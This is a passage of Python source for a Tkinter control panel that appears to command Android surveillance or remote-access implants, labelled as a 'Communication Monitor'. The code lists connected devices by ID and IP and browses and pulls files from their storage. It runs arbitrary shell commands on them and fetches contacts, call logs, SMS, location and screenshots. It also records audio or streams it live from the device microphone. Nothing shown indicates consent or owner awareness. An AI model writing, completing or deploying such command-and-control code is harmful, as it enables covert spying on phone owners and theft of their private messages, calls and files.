        """Handle double-click on tree items"""
        item_id = self.tree.focus()
        if item_id:
            item_values = self.tree.item(item_id, "values")
            if item_values and item_values[-1] == "Directory":
                path = self.get_full_path(item_id)
                self.navigate_to_directory(path)

    def navigate_to_directory(self, path):
        """Navigate to a directory"""
        if self.current_path != path:
            # Add current path to history
            if self.history_pos < len(self.path_history) - 1:
                # Truncate history if we're not at the end
                self.path_history = self.path_history[: self.history_pos + 1]

            self.path_history.append(path)
            self.history_pos = len(self.path_history) - 1

            # Update buttons
            self.back_button.config(
                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
            )
            self.forward_button.config(state=tk.DISABLED)

        self.current_path = path
        self.path_var.set(path)
        self.list_files_for_path(path)

    def go_back(self):
        """Navigate back in history"""
        if self.history_pos > 0:
            self.history_pos -= 1
            path = self.path_history[self.history_pos]
            self.current_path = path
            self.path_var.set(path)
            self.list_files_for_path(path)

            # Update buttons
            self.back_button.config(
                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
            )
            self.forward_button.config(state=tk.NORMAL)

    def go_forward(self):
        """Navigate forward in history"""
        if self.history_pos < len(self.path_history) - 1:
            self.history_pos += 1
            path = self.path_history[self.history_pos]
            self.current_path = path
            self.path_var.set(path)
            self.list_files_for_path(path)

            # Update buttons
            self.forward_button.config(
                state=(
                    tk.NORMAL
                    if self.history_pos < len(self.path_history) - 1
                    else tk.DISABLED
                )
            )
            self.back_button.config(state=tk.NORMAL)

    def go_up(self):
        """Navigate to parent directory"""
        if (
            self.current_path == "/"
            or self.current_path == ""
            or self.current_path == "/sdcard"
        ):
            return

        parent_path = os.path.dirname(self.current_path)
        if not parent_path:
            parent_path = "/sdcard"

        self.navigate_to_directory(parent_path)

    def navigate_to_path(self):
        """Navigate to the path in the entry field"""
        path = self.path_var.get()
        if not path:
            path = "/sdcard"

        self.navigate_to_directory(path)

    def open_directory(self, path):
        """Open a directory"""
        self.navigate_to_directory(path)

    def populate_tree(self):
        """Initial population of the tree"""
        self.status_var.set("Loading file list...")
        self.tree.delete(*self.tree.get_children())

        # Start with sdcard directory
        self.list_files_for_path("/sdcard")

    def populate_tree_for_path(self, path):
        """Populate tree with files from a specific path"""
        self.tree.delete(*self.tree.get_children())

        files = remote_fs_manager.get_files_from_cache(self.device_id, path)

        if files and len(files) > 0:
            # Sort directories first, then files
            directories = [f for f in files if f.get("type") == "directory"]
            regular_files = [f for f in files if f.get("type") != "directory"]

            # Sort directories and files by name
            directories.sort(key=lambda x: x.get("name", "").lower())
            regular_files.sort(key=lambda x: x.get("name", "").lower())

            # Add directories first
            for file_info in directories:
                name = file_info.get("name", "Unknown")
                size = file_info.get("size", 0)
                size_str = self.format_size(size)
                date = file_info.get("modified", "Unknown")

                icon = "📁"

                self.tree.insert(
                    "",
                    "end",
                    text=f"{icon} {name}",
                    values=(size_str, date, "Directory"),
                )

            # Then add files
            for file_info in regular_files:
                name = file_info.get("name", "Unknown")
                size = file_info.get("size", 0)
                size_str = self.format_size(size)
                date = file_info.get("modified", "Unknown")
                file_type = self.get_file_type(name)

                icon = Utils.get_file_icon(name)

                self.tree.insert(
                    "", "end", text=f"{icon} {name}", values=(size_str, date, file_type)
                )

            self.status_var.set(f"تم تحميل {len(files)} عنصر من {path}")
        else:
            self.status_var.set(f"لم يتم العثور على ملفات في {path} أو المجلد غير متاح")
            self.tree.insert(
                "", "end", text="📂 المجلد فارغ أو غير متاح", values=("", "", "")
            )

            # اقتراح مجلدات بديلة إذا كان المجلد فارغًا
            if path == "/" or path == "":
                self.tree.insert(
                    "",
                    "end",
                    text="💡 جرّب استخدام /sdcard بدلاً من ذلك",
                    values=("", "", ""),
                )
                # إضافة زر للانتقال إلى /sdcard
                go_to_sdcard = self.tree.insert(
                    "",
                    "end",
                    text="🔄 انقر هنا للذهاب إلى /sdcard",
                    values=("", "", "مجلد مقترح"),
                )
                # ربط حدث النقر المزدوج على هذا العنصر
                self.tree.item(go_to_sdcard, tags=("goto_sdcard",))
                self.tree.tag_bind(
                    "goto_sdcard",
                    "<Double-1>",
                    lambda e: self.navigate_to_directory("/sdcard"),
                )

    def list_files_for_path(self, path):
        """Request file listing for a path"""
        if not self.target_id:
            self.status_var.set("Error: No connected device")
            return

        # تحويل المسار '/' إلى '/sdcard' تلقائياً
        if path == "/":
            path = "/sdcard"
            self.current_path = "/sdcard"
            self.path_var.set("/sdcard")

        # عرض رسالة تحميل واضحة
        self.status_var.set(f"جاري تحميل قائمة الملفات من: {path}...")
        self.tree.delete(*self.tree.get_children())

        # إضافة مؤشر "جاري التحميل" للشجرة
        self.tree.insert(
            "", "end", text="⏳ جاري تحميل قائمة الملفات...", values=("", "", "")
        )
        self.window.update()  # تحديث الواجهة لإظهار رسالة التحميل

        # Check if we have a cached result that's still valid
        if remote_fs_manager.is_cache_valid(self.device_id, path):
            self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
            self.populate_tree_for_path(path)
            return

        # Request file listing from device
        try:
            result = send_command_to_client(
                self.target_id, Commands.SIO_CMD_LIST_FILES, args={"path": path}
            )

            if result.get("status") == "sent":
                self.current_path = path
                self.path_var.set(path)
                # سيتم تحديث الشجرة عند استلام الرد من خلال معالج استجابة uploadCommandFile
            else:
                self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
                self.status_var.set(
                    f"خطأ في طلب قائمة الملفات: {result.get('message', 'خطأ غير معروف')}"
                )
                # إضافة رسالة خطأ للشجرة
                self.tree.insert(
                    "",
                    "end",
                    text="⚠️ حدث خطأ في جلب قائمة الملفات",
                    values=("", "", ""),
                )

                # محاولة المسار البديل تلقائياً إذا فشل المسار الحالي
                if path != "/sdcard" and path != "/storage/emulated/0":
                    self.status_var.set("جاري محاولة المسار البديل...")
                    self.window.update()
                    self.list_files_for_path("/sdcard")
        except Exception as e:
            self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
            self.status_var.set(f"استثناء أثناء طلب قائمة الملفات: {str(e)}")
            # إضافة رسالة خطأ للشجرة
            self.tree.insert("", "end", text=f"⚠️ خطأ: {str(e)}", values=("", "", ""))
            logger.error(f"Exception in list_files_for_path: {e}", exc_info=True)

    def refresh_current_directory(self):
        """Refresh the current directory listing"""
        # Clear cache for this path
        remote_fs_manager.file_cache.pop(self.device_id, {})
        self.list_files_for_path(self.current_path)

    def format_size(self, size_bytes):
        """Format size in bytes to human-readable format"""
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        elif size_bytes < 1024 * 1024 * 1024:
            return f"{size_bytes / (1024 * 1024):.1f} MB"
        else:
            return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"

    def get_file_type(self, filename):
        """Get file type based on extension"""
        ext = os.path.splitext(filename)[1].lower()
        types = {
            ".txt": "Text File",
            ".json": "JSON Data",
            ".jpg": "JPEG Image",
            ".jpeg": "JPEG Image",
            ".png": "PNG Image",
            ".gif": "GIF Image",
            ".mp3": "MP3 Audio",
            ".wav": "WAV Audio",
            ".mp4": "MP4 Video",
            ".pdf": "PDF Document",
            ".doc": "Word Document",
            ".docx": "Word Document",
            ".xls": "Excel Spreadsheet",
            ".xlsx": "Excel Spreadsheet",
            ".zip": "ZIP Archive",
            ".rar": "RAR Archive",
            ".7z": "7Z Archive",
            ".apk": "Android Package",
            ".db": "Database File",
        }
        return types.get(ext, f"{ext.upper()[1:] if ext else 'Unknown'} File")

    def show_file_details(self, file_path):
        """Show details for the selected file"""
        selected_item = self.tree.focus()
        if not selected_item:
            return

        item_text = self.tree.item(selected_item, "text")
        item_values = self.tree.item(selected_item, "values")

        self.details_text.config(state=tk.NORMAL)
        self.details_text.delete("1.0", tk.END)

        self.details_text.insert(tk.END, f"Name: {item_text}\n")
        self.details_text.insert(tk.END, f"Size: {item_values[0]}\n")
        self.details_text.insert(tk.END, f"Modified: {item_values[1]}\n")
        self.details_text.insert(tk.END, f"Type: {item_values[2]}\n")
        self.details_text.insert(tk.END, f"Path: {file_path}\n")

        self.details_text.config(state=tk.DISABLED)

    def upload_selected(self):
        """Upload the selected file"""
        selected_item = self.tree.focus()
        if not selected_item:
            messagebox.showinfo(
                "Select File", "Please select a file to upload.", parent=self.window
            )
            return

        item_values = self.tree.item(selected_item, "values")
        if item_values[-1] == "Directory":
            messagebox.showinfo(
                "Select File",
                "Please select a file, not a directory.",
                parent=self.window,
            )
            return

        file_path = self.get_full_path(selected_item)
        self.upload_file(file_path)

    def upload_file(self, file_path):
        """Upload a specific file"""
        if not self.target_id:
            messagebox.showerror("Error", "No connected device.", parent=self.window)
            return

        result = send_command_to_client(
            self.target_id,
            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
            args={"path": file_path},
        )

        if result.get("status") == "sent":
            self.status_var.set(f"Upload requested for: {file_path}")
        else:
            messagebox.showerror(
                "Upload Error",
                f"Failed to request upload: {result.get('message', 'Unknown error')}",
                parent=self.window,
            )

    def analyze_selected(self):
        """Analyze the selected file"""
        selected_item = self.tree.focus()
        if not selected_item:
            messagebox.showinfo(
                "Select File", "Please select a file to analyze.", parent=self.window
            )
            return

        file_path = self.get_full_path(selected_item)
        self.analyze_file(file_path)

    def analyze_file(self, file_path):
        """Analyze a specific file"""
        if not self.target_id:
            messagebox.showerror("Error", "No connected device.", parent=self.window)
            return

        result = send_command_to_client(
            self.target_id,
            Commands.SIO_CMD_ANALYZE_CONTENT,
            args={"filePath": file_path},
        )

        if result.get("status") == "sent":
            self.status_var.set(f"Analysis requested for: {file_path}")
        else:
            messagebox.showerror(
                "Analysis Error",
                f"Failed to request analysis: {result.get('message', 'Unknown error')}",
                parent=self.window,
            )

    def execute_command(self):
        """Execute a shell command"""
        if not self.target_id:
            messagebox.showerror("Error", "No connected device.", parent=self.window)
            return

        command = simpledialog.askstring(
            "Execute Command",
            "Enter the system command to execute:",
            parent=self.window,
        )

        if command:
            result = send_command_to_client(
                self.target_id,
                Commands.SIO_CMD_EXECUTE_SHELL,
                args={"command": command},
            )

            if result.get("status") == "sent":
                self.status_var.set(f"Command sent: {command}")
            else:
                messagebox.showerror(
                    "Command Error",
                    f"Failed to send command: {result.get('message', 'Unknown error')}",
                    parent=self.window,
                )

    def close(self):
        """Close the window"""
        self.window.destroy()


# --- Main GUI Application ---
class AdvancedControlPanelApp:
    def __init__(self, master):
        self.master = master
        master.title("Advanced Communication Monitor Control Panel v2.0")
        master.geometry("1200x800")
        master.minsize(1000, 700)

        # State
        self.current_selected_live_client_sid = None
        self.current_selected_historical_device_id = None
        self.file_browser = None

        # List managers
        self.live_clients_manager = None
        self.historical_devices_manager = None

        self._setup_main_interface()
        self._initialize_data()

    def _setup_main_interface(self):
        """إعداد الواجهة الرئيسية"""
        self._create_menu_bar()

        main_pane = ttk.PanedWindow(self.master, orient=tk.HORIZONTAL)
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        left_pane = ttk.Frame(main_pane, width=350)
        main_pane.add(left_pane, weight=1)
        self._setup_left_panel(left_pane)

        right_pane = ttk.Frame(main_pane, width=850)
        main_pane.add(right_pane, weight=3)
        self._setup_right_panel(right_pane)

    def _create_menu_bar(self):
        """إنشاء شريط القوائم"""
        menubar = tk.Menu(self.master)
        self.master.config(menu=menubar)

        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Open File Browser", command=self.open_file_browser)
        file_menu.add_command(
            label="Export Device Data", command=self._export_device_data
        )
        file_menu.add_command(label="Import Settings", command=self._import_settings)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.master.quit)

        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Clear All Data", command=self._clear_all_data)
        tools_menu.add_command(label="Server Status", command=self._show_server_status)
        tools_menu.add_command(
            label="Refresh File Cache", command=lambda: remote_fs_manager.clear_cache()
        )

        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self._show_about)

    def _setup_left_panel(self, parent):
        """إعداد اللوحة اليسرى"""
        # Live clients
        live_clients_frame = ttk.LabelFrame(parent, text="🟢 Live Monitors (Active)")
        live_clients_frame.pack(pady=5, padx=5, fill=tk.X)

        self.live_clients_listbox = tk.Listbox(
            live_clients_frame, height=8, font=("Arial", 9)
        )
        scrollbar_live = ttk.Scrollbar(live_clients_frame, orient="vertical")
        self.live_clients_listbox.config(yscrollcommand=scrollbar_live.set)
        scrollbar_live.config(command=self.live_clients_listbox.yview)

        self.live_clients_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        scrollbar_live.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_listbox.bind("<<ListboxSelect>>", self._on_live_client_select)

        # Add right-click menu for live clients
        self.live_clients_listbox.bind("<Button-3>", self._on_live_client_right_click)

        # Historical devices
        historical_devices_frame = ttk.LabelFrame(
            parent, text="📁 Historical Monitors (Archive)"
        )
        historical_devices_frame.pack(pady=5, padx=5, fill=tk.X)

        self.historical_devices_listbox = tk.Listbox(
            historical_devices_frame, height=12, font=("Arial", 9)
        )
        scrollbar_hist = ttk.Scrollbar(historical_devices_frame, orient="vertical")
        self.historical_devices_listbox.config(yscrollcommand=scrollbar_hist.set)
        scrollbar_hist.config(command=self.historical_devices_listbox.yview)

        self.historical_devices_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        scrollbar_hist.pack(side=tk.RIGHT, fill=tk.Y)
        self.historical_devices_listbox.bind(
            "<<ListboxSelect>>", self._on_historical_device_select
        )

        # Add right-click menu for historical devices
        self.historical_devices_listbox.bind(
            "<Button-3>", self._on_historical_device_right_click
        )

        # Archive buttons
        archive_buttons_frame = ttk.Frame(historical_devices_frame)
        archive_buttons_frame.pack(fill=tk.X, padx=5, pady=2)

        ttk.Button(
            archive_buttons_frame,
            text="🔄 Refresh",
            command=self.refresh_historical_device_list,
        ).pack(side=tk.LEFT, padx=2)
        ttk.Button(
            archive_buttons_frame, text="🏷️ Tag Device", command=self._tag_device
        ).pack(side=tk.LEFT, padx=2)
        ttk.Button(
            archive_buttons_frame, text="🗑️ Delete", command=self._delete_device_data
        ).pack(side=tk.LEFT, padx=2)

        # Add Browse Files button
        ttk.Button(
            archive_buttons_frame,
            text="📂 Browse Files",
            command=self.open_file_browser,
        ).pack(side=tk.LEFT, padx=2)

        # Activity log
        log_frame = ttk.LabelFrame(parent, text="📊 System Activity Log")
        log_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        self.log_text = scrolledtext.ScrolledText(
            log_frame, height=12, wrap=tk.WORD, state=tk.DISABLED, font=("Consolas", 9)
        )
        self.log_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

    def _setup_right_panel(self, parent):
        """إعداد اللوحة اليمنى"""
        # Device details
        details_frame = ttk.LabelFrame(parent, text="📋 Monitor Details & Data Files")
        details_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        self.details_text = scrolledtext.ScrolledText(
            details_frame,
            height=18,
            wrap=tk.WORD,
            state=tk.DISABLED,
            font=("Consolas", 9),
        )
        self.details_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Commands panel
        self.commands_frame = ttk.LabelFrame(parent, text="🎮 Monitor Control Commands")
        self.commands_frame.pack(pady=5, padx=5, fill=tk.X)
        self._setup_commands_panel()

    def _on_live_client_right_click(self, event):
        """Handle right-click on live clients listbox"""
        # Select the item under cursor
        self.live_clients_listbox.selection_clear(0, tk.END)
        self.live_clients_listbox.selection_set(
            self.live_clients_listbox.nearest(event.y)
        )
        self.live_clients_listbox.activate(self.live_clients_listbox.nearest(event.y))

        # Update selected client
        self._on_live_client_select()

        # Create context menu
        context_menu = Menu(self.master, tearoff=0)
        context_menu.add_command(label="Browse Files", command=self.open_file_browser)
        context_menu.add_command(
            label="Get Social Network Data", command=self.get_social_network_data
        )
        context_menu.add_command(
            label="Get Communication History", command=self.get_communication_history
        )
        context_menu.add_command(label="Record Audio", command=self.record_audio_fixed)
        context_menu.add_separator()
        context_menu.add_command(label="Tag Device", command=self._tag_device)

        # Display the menu
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def _on_historical_device_right_click(self, event):
        """Handle right-click on historical devices listbox"""
        # Select the item under cursor
        self.historical_devices_listbox.selection_clear(0, tk.END)
        self.historical_devices_listbox.selection_set(
            self.historical_devices_listbox.nearest(event.y)
        )
        self.historical_devices_listbox.activate(
            self.historical_devices_listbox.nearest(event.y)
        )

        # Update selected device
        self._on_historical_device_select()

        # Create context menu
        context_menu = Menu(self.master, tearoff=0)

        # Check if device is online
        is_online = self.current_selected_live_client_sid is not None

        if is_online:
            context_menu.add_command(
                label="Browse Files", command=self.open_file_browser
            )
            context_menu.add_separator()

        context_menu.add_command(
            label="View Details",
            command=lambda: self.display_device_details(
                self.current_selected_historical_device_id
            ),
        )
        context_menu.add_command(label="Tag Device", command=self._tag_device)
        context_menu.add_command(label="Delete Data", command=self._delete_device_data)

        # Display the menu
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def _setup_commands_panel(self):
        """إعداد لوحة الأوامر"""
        commands_notebook = ttk.Notebook(self.commands_frame)
        commands_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Basic operations tab
        basic_tab = ttk.Frame(commands_notebook)
        commands_notebook.add(basic_tab, text="Basic Operations")
        self._setup_basic_commands(basic_tab)

        # Communication analysis tab
        comm_tab = ttk.Frame(commands_notebook)
        commands_notebook.add(comm_tab, text="Communication Analysis")
        self._setup_communication_commands(comm_tab)

        # Audio monitoring tab
        audio_tab = ttk.Frame(commands_notebook)
        commands_notebook.add(audio_tab, text="Audio Monitoring")
        self._setup_audio_commands(audio_tab)

        # File operations tab
        file_tab = ttk.Frame(commands_notebook)
        commands_notebook.add(file_tab, text="File Operations")
        self._setup_file_commands(file_tab)

    def _setup_basic_commands(self, parent):
        """إعداد الأوامر الأساسية"""
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        commands = [
            ("📷 Capture Screen", self.take_screenshot),
            ("📂 List Files", self.list_files),
            ("🌍 Get Location", self.get_location),
            ("📤 Upload File", self.upload_specific_file),
            ("⚡ Execute Command", self.execute_shell_command),
        ]

        self.command_buttons = {}
        for i, (text, command) in enumerate(commands):
            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
            self.command_buttons[text] = button

        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _setup_file_commands(self, parent):
        """Setup file operation commands"""
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # File browser button
        file_browser_button = ttk.Button(
            frame,
            text="📂 Open File Browser",
            command=self.open_file_browser,
            state=tk.DISABLED,
        )
        file_browser_button.grid(
            row=0, column=0, columnspan=2, padx=5, pady=5, sticky="ew"
        )
        self.command_buttons["📂 Open File Browser"] = file_browser_button

        # Other file commands
        commands = [
            ("🔍 Catalog Library", self.catalog_library_content),
            ("📊 Analyze Content", self.analyze_specific_content),
            ("⚙️ Process Queue", self.process_content_queue),
        ]

        for i, (text, command) in enumerate(commands, start=1):
            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
            button.grid(
                row=i // 2 + (1 if i % 2 == 0 else 0),
                column=i % 2,
                padx=5,
                pady=5,
                sticky="ew",
            )
            self.command_buttons[text] = button

        # Smart options frame
        options_frame = ttk.LabelFrame(frame, text="🤖 Smart Options")
        options_frame.grid(row=3, column=0, columnspan=2, sticky="ew", padx=5, pady=5)

        self.battery_aware_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(
            options_frame,
            text="Battery-aware processing",
            variable=self.battery_aware_var,
        ).pack(anchor="w", padx=5, pady=2)

        self.network_optimized_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(
            options_frame,
            text="Network-optimized transfers",
            variable=self.network_optimized_var,
        ).pack(anchor="w", padx=5, pady=2)

        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _setup_communication_commands(self, parent):
        """إعداد أوامر تحليل الاتصالات"""
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        commands = [
            ("👥 Social Network Analysis", self.get_social_network_data),
            ("📞 Communication History", self.get_communication_history),
            ("📋 Contacts List", self.get_contacts_list),
            ("📲 Call Logs", self.get_call_logs),
            ("💬 SMS Messages", self.get_sms_list),
        ]

        for i, (text, command) in enumerate(commands):
            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
            self.command_buttons[text] = button

        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _setup_audio_commands(self, parent):
        """إعداد أوامر المراقبة الصوتية"""
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Fixed recording
        self.record_audio_button = ttk.Button(
            frame,
            text="🎤 Fixed Duration Recording",
            command=self.record_audio_fixed,
            state=tk.DISABLED,
        )
        self.record_audio_button.grid(
            row=0, column=0, columnspan=2, padx=5, pady=5, sticky="ew"
        )

        # Live audio frame
        live_audio_frame = ttk.LabelFrame(frame, text="🔴 Live Audio Stream Control")
        live_audio_frame.grid(
            row=1, column=0, columnspan=2, sticky="ew", padx=5, pady=5
        )

        self.start_live_audio_button = ttk.Button(
            live_audio_frame,
            text="▶️ Start Live Stream",
            command=self.start_live_audio,
            state=tk.DISABLED,
        )
        self.start_live_audio_button.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

        self.stop_live_audio_button = ttk.Button(
            live_audio_frame,
            text="⏹️ Stop Live Stream",
            command=self.stop_live_audio,
            state=tk.DISABLED,
        )
        self.stop_live_audio_button.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        # Status
        self.live_audio_status_var = tk.StringVar()
        self.live_audio_status_var.set("Live Audio: Idle")
        live_audio_status_label = ttk.Label(
            live_audio_frame,
            textvariable=self.live_audio_status_var,
            font=("Arial", 10, "bold"),
        )
        live_audio_status_label.grid(row=1, column=0, columnspan=2, padx=5, pady=2)

        live_audio_frame.columnconfigure(0, weight=1)
        live_audio_frame.columnconfigure(1, weight=1)
        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _initialize_data(self):
        """تهيئة البيانات الأولية"""
        # Initialize list managers
        self.live_clients_manager = ListManager(
            self.live_clients_listbox, connected_clients_sio
        )
        self.historical_devices_manager = ListManager(
            self.historical_devices_listbox, None
        )

        self.update_live_clients_list()
        self.refresh_historical_device_list()
        self.add_system_log("Advanced Communication Monitor Control Panel Initialized")

        # Check library status
        if not SOUNDDEVICE_AVAILABLE:
            self.add_system_log(
                "WARNING: sounddevice/numpy missing. Live audio playback disabled.",
                level="warning",
            )
            self.live_audio_status_var.set("Live Audio: Disabled (Missing Libraries)")
        if not PIL_AVAILABLE:
            self.add_system_log(
                "WARNING: PIL missing. Image preview disabled.", level="warning"
            )

    # --- System Log Methods ---
    def add_system_log(self, message, level="info"):
        """إضافة رسالة إلى سجل النظام"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level.upper()}] {message}\n"

        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

        # Log to system logger
        if level == "info":
            logger.info(message)
        elif level == "warning":
            logger.warning(message)
        elif level == "error":
            logger.error(message)

    # --- List Management Methods ---
    def update_live_clients_list(self):
        """تحديث قائمة العملاء المتصلين"""

        def format_client(sid_info_pair):
            sid, info = sid_info_pair
            display_name = info.get("name_display", "Unknown Monitor")
            device_id = info.get("id", "Unknown ID")
            ip = info.get("ip", "N/A")
            capabilities = info.get("capabilities", [])
            last_seen_iso = info.get("last_seen")

            last_seen_str = "Never"
            if last_seen_iso:
                try:
                    last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
                    last_seen_str = last_seen_dt.strftime("%H:%M:%S")
                except ValueError:
                    last_seen_str = "Invalid"

            caps_str = ",".join(capabilities[:2]) if capabilities else "basic"
            if len(capabilities) > 2:
                caps_str += f",+{len(capabilities)-2}"

            # أيقونة خضراء للإشارة إلى أن الجهاز متصل
            status_icon = "🟢" if stream_active_for_device.get(sid, False) else "🟢"
            return f"{status_icon} {display_name} | {device_id} | {ip} | [{caps_str}] | {last_seen_str}"

        items = list(connected_clients_sio.items()) if connected_clients_sio else []
        self.live_clients_manager.refresh_list(items, format_client)

    def refresh_historical_device_list(self):
        """تحديث قائمة الأجهزة التاريخية"""

        def format_device(device_id):
            tag = device_manager.get_tag(device_id)
            device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
            file_count = self._count_files_in_device_folder(device_folder)

            is_online = any(
                info.get("id") == device_id for info in connected_clients_sio.values()
            )
            status_icon = "🟢" if is_online else "📱"

            display_entry = f"{status_icon} {device_id}"
            if tag:
                display_entry += f" 🏷️[{tag}]"
            display_entry += f" 📊({file_count} files)"
            return display_entry

        try:
            devices = [
                d
                for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
                if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
            ]

            if devices:
                devices.sort(
                    key=lambda x: os.path.getmtime(
                        os.path.join(AppConfig.DATA_RECEIVED_DIR, x)
                    ),
                    reverse=True,
                )

            self.historical_devices_manager.refresh_list(devices, format_device)

            # إعادة تحديد الجهاز المحدد سابقاً
            if self.current_selected_historical_device_id:
                for i, device_id in enumerate(
                    self.historical_devices_manager.items_in_listbox
                ):
                    if device_id == self.current_selected_historical_device_id:
                        self.historical_devices_listbox.selection_set(i)
                        break

        except FileNotFoundError:
            self.historical_devices_listbox.delete(0, tk.END)
            self.historical_devices_listbox.insert(
                tk.END, "❌ Data directory not found"
            )
            self.historical_devices_listbox.config(fg="grey")
            logger.error(f"Data directory not found: {AppConfig.DATA_RECEIVED_DIR}")

    def _count_files_in_device_folder(self, device_folder):
        """عد الملفات في مجلد الجهاز"""
        try:
            file_count = 0
            for root, dirs, files in os.walk(device_folder):
                file_count += len(files)
            return file_count
        except:
            return 0

    def update_live_clients_list_item(self, sid_to_update):
        """تحديث عنصر واحد في قائمة العملاء"""
        try:
            # For simplicity, just refresh the entire list
            self.update_live_clients_list()
        except Exception as e:
            logger.error(
                f"Error updating live client list item for SID {sid_to_update}: {e}"
            )

    # --- Selection Event Handlers ---
    def _on_live_client_select(self, event=None):
        """معالج تحديد عميل متصل"""
        selected_item = self.live_clients_manager.get_selected_item()

        if selected_item:
            sid, info = selected_item

            # تحديث العميل المحدد الحالي
            previous_selection = self.current_selected_live_client_sid
            self.current_selected_live_client_sid = sid
            selected_device_id = info.get("id", "Unknown ID")

            self.add_system_log(
                f"Selected live monitor: {selected_device_id} (SID: {sid})"
            )

            # تمكين جميع عناصر التحكم
            self._enable_commands(True)
            self.display_device_details(selected_device_id)

            # Update audio status
            is_streaming = stream_active_for_device.get(sid, False)
            self.live_audio_status_var.set(
                "Live Audio: Receiving..." if is_streaming else "Live Audio: Idle"
            )

            if SOUNDDEVICE_AVAILABLE:
                self.start_live_audio_button.config(
                    state=tk.DISABLED if is_streaming else tk.NORMAL
                )
                self.stop_live_audio_button.config(
                    state=tk.NORMAL if is_streaming else tk.DISABLED
                )

            # تمييز العنصر المحدد بشكل واضح
            self.live_clients_listbox.selection_clear(0, tk.END)
            for i, item in enumerate(self.live_clients_manager.items_in_listbox):
                if item[0] == sid:
                    self.live_clients_listbox.selection_set(i)
                    self.live_clients_listbox.see(i)  # التأكد من أن العنصر مرئي
                    break

            # إذا كان العنصر المحدد سابقاً هو نفسه العنصر الحالي، فلا نلغي التحديد
            if previous_selection == sid:
                self._ensure_selection_active()

        else:
            # إذا لم يتم تحديد أي عميل، لا نقوم بإلغاء التحديد الحالي
            # بدلاً من ذلك، نعيد تحديد العميل المحدد سابقاً إن وجد
            if self.current_selected_live_client_sid:
                self._ensure_selection_active()
            else:
                self._enable_commands(False)

    def _ensure_selection_active(self):
        """التأكد من أن التحديد نشط في الواجهة"""
        # تمييز العنصر المحدد في قائمة العملاء المتصلين
        if self.current_selected_live_client_sid:
            self.live_clients_listbox.selection_clear(0, tk.END)
            for i, item in enumerate(self.live_clients_manager.items_in_listbox):
                if item[0] == self.current_selected_live_client_sid:
                    self.live_clients_listbox.selection_set(i)
                    break

        # تمييز العنصر المحدد في قائمة الأجهزة التاريخية
        if self.current_selected_historical_device_id:
            self.historical_devices_listbox.selection_clear(0, tk.END)
            for i, device_id in enumerate(
                self.historical_devices_manager.items_in_listbox
            ):
                if device_id == self.current_selected_historical_device_id:
                    self.historical_devices_listbox.selection_set(i)
                    break

    def _on_historical_device_select(self, event=None):
        """معالج تحديد جهاز تاريخي"""
        selected_device_id = self.historical_devices_manager.get_selected_item()

        # إلغاء التحديد إذا تم تحديد نفس العنصر مرة ثانية
        if (
            selected_device_id
            and self.current_selected_historical_device_id == selected_device_id
        ):
            return

        if selected_device_id:
            self.current_selected_historical_device_id = selected_device_id
            self.add_system_log(f"Selected archived monitor: {selected_device_id}")
            self.display_device_details(selected_device_id)

            # Check if device is online
            live_sid = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == selected_device_id
                ),
                None,
